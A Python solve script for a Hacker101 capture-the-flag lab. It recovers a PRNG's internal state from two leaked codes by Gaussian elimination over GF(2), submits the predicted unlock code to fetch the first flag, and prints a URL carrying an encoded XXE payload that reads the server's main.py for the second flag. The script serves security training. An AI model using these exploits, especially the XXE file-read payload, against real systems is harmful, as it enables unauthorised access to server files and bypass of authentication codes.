# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("[1] Enter your ctf id: ")}.ctf.hacker101.com"

# PRNGTracker class models and tracks the internal state of a pseudo-random number generator (PRNG)
# using symbolic bit sets. It reconstructs the internal state by observing output bits and solves
# a system of linear equations over GF(2) to predict future outputs deterministically.
class PRNGTracker:
    def __init__(self, rng_res):
        # Reserved set for XOR toggling
        self.RESERVED = {64}
        # Input random numbers received from server
        self.rng_res = rng_res
        # Number of bits per number
        self.NBIT = 26
        # Number of random numbers received
        self.NNUMBER = len(rng_res)
        # Initialize the internal tracked state
        self.state_a = self.initialise_state_a()
        # Storage for tracked output bits
        self.all_ret = []

    def initialise_state_a(self):
        # Initialize the PRNG state with identity tracking sets
        return [{63 - i} for i in range(64)]

    def getrandbit_track(self):
        # Simulate the generation of one random bit while tracking bit dependencies
        ret = self.state_a[-1]  # The output bit is the LSB (last element)

        # Shift and XOR operation modeling state update (forward PRNG one step)
        new = [None] * 64
        for i in range(61):
            new[i] = self.state_a[i + 1]
        new[61] = self.state_a[62] ^ self.state_a[0]
        new[62] = self.state_a[63] ^ self.state_a[1]
        new[63] = self.state_a[2]
        self.state_a = new[:]

        # XOR each bit with RESERVED to simulate bit flipping
        self.state_a = [i ^ self.RESERVED for i in self.state_a]

        # Simulate nibble-wise substitution with nonlinear mapping
        for j in range(0, 64, 4):
            if j == 0:
                cur = self.state_a[-j - 4:]
            else:
                cur = self.state_a[-j - 4:-j]
            # Apply a fixed permutation mapping to bits
            cur_ = [cur[-1], cur[-1], cur[-4], cur[-4]]
            i = 0
            for k in range(60 - j, 64 - j):
                self.state_a[k] = self.state_a[k] ^ cur_[i]
                i += 1

        return self.state_a, ret

    def solve_xor(self, eqns):
        # Gaussian elimination on system of linear equations over GF(2)
        res = list(self.RESERVED)[0]
        # Normalize all equations by removing the reserved constant
        for idx, eqn in enumerate(eqns):
            if res in eqn[0]:
                eqn[0] = eqn[0] ^ self.RESERVED
                eqn[1] = eqn[1] ^ 1
                eqns[idx] = eqn

        used = []
        for bit in range(64):
            cut_short = False
            eqn_idx = 0

            # Find pivot row for current bit
            while eqn_idx < len(eqns):
                eqn = eqns[eqn_idx]
                if bit not in eqn[0] or eqn_idx in used:
                    eqn_idx += 1
                    continue
                else:
                    first_idx = eqn_idx
                    eqn_idx += 1
                    break
                if eqn_idx == len(eqns) - 1:
                    cut_short = True
            if cut_short:
                continue

            used.append(first_idx)

            # Eliminate current bit from all other equations
            eqn_idx = 0
            while eqn_idx < len(eqns):
                if eqn_idx == first_idx:
                    eqn_idx += 1
                    continue
                if bit in eqns[eqn_idx][0]:
                    mod_eqn = eqns[first_idx][0] ^ eqns[eqn_idx][0]
                    mod_bit = eqns[first_idx][1] ^ eqns[eqn_idx][1]
                    eqns[eqn_idx] = [mod_eqn, mod_bit]
                eqn_idx += 1

        # Check for contradictions in the system
        for eqn in eqns:
            if len(eqn[0]) == 0 and eqn[1] == 1:
                print("[WARNING] System of equations make no sense")

        # Remove redundant (empty) equations
        return [i for i in eqns if len(i[0]) != 0]

    def decompose_eqn(self, eqns_, eqn_to_decompose):
        # Decompose a tracked expression into known linear combinations
        A = eqn_to_decompose
        contains_res = self.RESERVED in A
        eqns = eqns_ + [[A]]
        used = []
        composition = []

        for bit in range(64):
            cut_short = False
            eqn_idx = 0

            # Gaussian elimination only on last equation (eqn_to_decompose)
            while eqn_idx < len(eqns) - 1:
                eqn = eqns[eqn_idx]
                if bit not in eqn[0] or eqn_idx in used:
                    eqn_idx += 1
                    continue
                else:
                    first_idx = eqn_idx
                    break
                if eqn_idx == len(eqns) - 2:
                    cut_short = True
            if cut_short:
                continue

            used.append(first_idx)

            # Eliminate bit from target equation
            if bit in eqns[-1][0]:
                mod_eqn = eqns[first_idx][0] ^ eqns[-1][0]
                eqns[-1] = [mod_eqn, None]
                composition.append(first_idx)

        # Check if complete decomposition was successful
        if len(eqns[-1][0]) != 0:
            print("[WARNING] Equation cannot be composed from given eqns")

        return composition

    def run(self):
        import time
        t = time.time()

        # Convert input numbers to binary bits
        ret_b = [int(i) for i in "".join(
            ['0' * (self.NBIT - len(bin(i)[2:])) + bin(i)[2:] for i in self.rng_res])]

        # Generate equations corresponding to observed output bits
        for _ in range(self.NBIT * self.NNUMBER):
            self.state_a, ret = self.getrandbit_track()
            self.all_ret.append(ret)

        # Solve for initial state using Gaussian elimination
        eqns = [[x, y] for x, y in zip(self.all_ret, ret_b)]
        eqns = self.solve_xor(eqns)
        eqns_rhs = [eq[1] for eq in eqns]

        # Predict next output bits from PRNG
        pred_eqns = []
        for _ in range(self.NBIT):
            self.state_a, ret = self.getrandbit_track()
            pred_eqns.append(ret)

        # Express each predicted bit as a combination of known solved equations
        bits = ""
        for pred_eqn in pred_eqns:
            composition = self.decompose_eqn(eqns, pred_eqn)
            pred = eqns_rhs[composition[0]]
            for idx in composition[1:]:
                pred ^= eqns_rhs[idx]
            bits += str(pred)
        
        # Return prediction result
        return int(bits, 2)

# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Getting Pseudo Random numbers
        pseudo_random_number_1 = int(post_request(f'{ctf_url}/unlock', data = {"code": 382723}).text.replace('Code incorrect.  Expected ', ''))
        pseudo_random_number_2 = int(post_request(f'{ctf_url}/unlock', data = {"code": 382723}).text.replace('Code incorrect.  Expected ', ''))
        # Initializing PRNG Tracker
        tracker = PRNGTracker(rng_res = [pseudo_random_number_1, pseudo_random_number_2])
        # Getting Flag from correct code....
        response = post_request(f'{ctf_url}/unlock', data = {"code": tracker.run()}).text
        # Printing Flag1
        print(f'\033[32m[2] First flag is ^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", response).group(1)}$FLAG$\033[0m')
        # Link to get Flag0
        print(f"\033[32m[3] To get the second flag visit this link and see source code: {ctf_url}/set-config?data=%3C%3Fxml%20version%3D%221%2E0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22main%2Epy%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E  \033[0m")
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m{str(e)}\033[0m")